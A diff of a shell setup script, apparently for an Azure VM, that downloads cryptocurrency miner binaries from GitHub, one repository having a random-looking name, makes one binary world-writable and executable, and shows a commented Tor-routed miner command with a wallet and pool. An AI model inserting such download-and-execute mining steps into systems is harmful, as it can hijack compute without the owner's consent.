@@ -35,6 +35,10 @@ mkdir /home/azureuser/qub_dir
 cd /home/azureuser/qub_dir
 wget https://github.com/samuraifinseev/jkldashdjasopiwqeohbvxc89123nbjkczxvsdi/raw/main/qubic.tar.gz -P /home/azureuser/qub_dir -N
 tar -xf /home/azureuser/qub_dir/qubic.tar.gz
+### QUBIC \ qubic-soluion \
+wget https://github.com/Qubic-Solutions/rqiner-builds/releases/download/v1.0.9c/rqiner-x86-cascadelake -P /home/azureuser/qub_dir -N
+chmod 777 /home/azureuser/qub_dir/rqiner-x86-cascadelake
+
 
 cd /home/azureuser
 #### spectre TNN MINER \\\\ torify ./tnn-miner --spectre --wallet spectre:qrrjcpuscnzylt3ukzjymwslp9e68zer2h8gdr6dk88hg53mncavxzhcepxsw --daemon-address spr.tw-pool.com --port 14001 --worker-name test --threads 2
